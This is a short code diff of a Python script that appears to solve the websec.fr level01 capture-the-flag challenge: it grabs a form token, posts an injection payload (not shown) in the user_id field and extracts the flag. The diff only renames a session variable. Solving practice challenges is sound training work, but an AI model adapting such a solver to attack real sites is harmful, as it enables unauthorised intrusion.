@@ -10,8 +10,8 @@ url = "https://websec.fr/level01/index.php"
 pattern = "(?<=value=\")(.*)(?=\">)"
 flag_pattern = "(?<=WEBSEC{)(.*)(?=})"
 
-pwn = requests.Session()
-getToken = pwn.get(url)
+s = requests.Session()
+getToken = s.get(url)
 
 token = re.search(pattern, getToken.text)[0]
 
@@ -40,7 +40,7 @@ data = {"user_id": f"{payload}",
         "submit": "Enviar", 
         "token": f"{token}"}
 
-submit = pwn.post(url, headers=headers, data=data)
+submit = s.post(url, headers=headers, data=data)
 
 flag = "WEBSEC{" + re.search(flag_pattern, submit.text)[0] + "}"
 print(flag)
